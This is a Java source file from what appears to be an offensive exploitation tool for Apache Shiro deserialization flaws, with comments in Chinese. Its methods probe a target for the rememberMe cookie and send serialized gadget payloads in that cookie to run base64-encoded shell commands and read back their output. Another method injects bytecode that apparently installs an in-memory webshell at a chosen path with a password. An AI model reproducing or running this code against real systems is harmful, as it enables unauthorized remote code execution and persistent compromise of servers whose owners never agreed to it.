package vulgui.exp;

import com.sun.xml.internal.ws.util.StringUtils;
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.catalina.startup.Tomcat;
import org.apache.tomcat.util.codec.binary.Base64;
import vulgui.deser.echo.EchoPayload;
import vulgui.deser.frame.FramePayload;
import vulgui.deser.frame.Shiro;
import vulgui.deser.payloads.ObjectPayload;
import vulgui.deser.plugins.keytest.KeyEcho;
import vulgui.deser.plugins.servlet.MemBytes;
import vulgui.deser.util.Gadgetsplugin;
import vulgui.utils.HttpUtil;

import javax.xml.bind.DatatypeConverter;
import java.net.HttpURLConnection;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * @className DserUtil
 * @Description 反序列化工具类, 目前主要支持框架为Shiro
 * @Author JF
 * @Date 2020/9/11 11:08
 * @Version 1.0
 **/
public class DserUtil {
    private int timeout = 10000;

    public static Object principal = null;
    public static ObjectPayload<?> gadgetpayload = null;
    public static FramePayload<?> genpayload = null;

    static {
        principal = KeyEcho.getObject();
    }

    public static void init_gen(String gadgetOption, String framename) throws IllegalAccessException, InstantiationException {
        // gadget 选择
        Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass(gadgetOption);
        DserUtil.gadgetpayload = gadgetClazz.newInstance();

        // 框架封装序列化数据生成最终payload
        final Class<? extends FramePayload> payloadClass = FramePayload.Utils.getPayloadClass(framename);
        DserUtil.genpayload = (Shiro) payloadClass.newInstance();
    }


    public static boolean rememberMe(String targeturl, int timeout) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Cookie", "rememberMe=1");

        HttpURLConnection conn = HttpUtil.get(targeturl, null, headers, timeout, timeout, "utf-8");


        Map<String, List<String>> resheaders = conn.getHeaderFields();
        if (resheaders.containsKey("Set-Cookie")) {
            List<String> list = resheaders.get("Set-Cookie");
            for (String item : list) {
                if (item.contains("rememberMe")) {
                    return true;
                }
            }
        }
        conn.disconnect();
        return false;
    }

    public static String exec(String targeturl, String sendpayload, String command, int timeout) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Cookie", sendpayload);

        // 添加执行命令
        String base64Command = DatatypeConverter.printBase64Binary(command.getBytes());

        Map<String, String> params = new HashMap<String, String>();

        params.put("c", base64Command);

        HttpURLConnection conn = HttpUtil.post(targeturl, params, headers, timeout, timeout, "utf-8");

        String responseText = HttpUtil.getBody(conn, "utf-8");

        String result;
        try {
            result = responseText.substring(responseText.indexOf("$$$") + 1, responseText.lastIndexOf("$$$"));
        } catch (Exception e) {
            return null;
        }

        if (result.length() != 0) {
            return new String(DatatypeConverter.parseBase64Binary(result));
        } else {
            return null;
        }
    }


    public static boolean execTest(String targeturl, String sendpayload, int timeout) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Cookie", sendpayload);

        HttpURLConnection conn = HttpUtil.get(targeturl, null, headers, timeout, timeout, "utf-8");
        // 判断teste回显echo返回头是否存在

        Map<String, List<String>> resheaders = conn.getHeaderFields();
        if (resheaders.containsKey("Set-Cookie")) {
            List<String> list = resheaders.get("Set-Cookie");
            for (String item : list) {
                if (item.contains("rememberMe")) {
                    return false;
                }
            }
        }
        return true;
    }

    public static boolean execInject(String targeturl, String rememberMe, String b64Bytecode, String injectPath, String injectPass, int timeout) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Cookie", rememberMe);

        // 添加post请求中base64字节码
        Map<String, String> params = new HashMap<String, String>();

        params.put("dy", b64Bytecode);
        params.put("path", injectPath);

        if (!"".equals(injectPass)) {
            params.put("p", injectPass);
        }

        HttpURLConnection conn = HttpUtil.post(targeturl, params, headers, timeout, timeout, "utf-8");

        String responseText = HttpUtil.getBody(conn, "utf-8");

        try {
            assert responseText != null;
            if (responseText.contains("dynamic inject success")) {
                return true;
            }
        } catch (Exception e) {
            return false;
        }

        return false;
    }
}
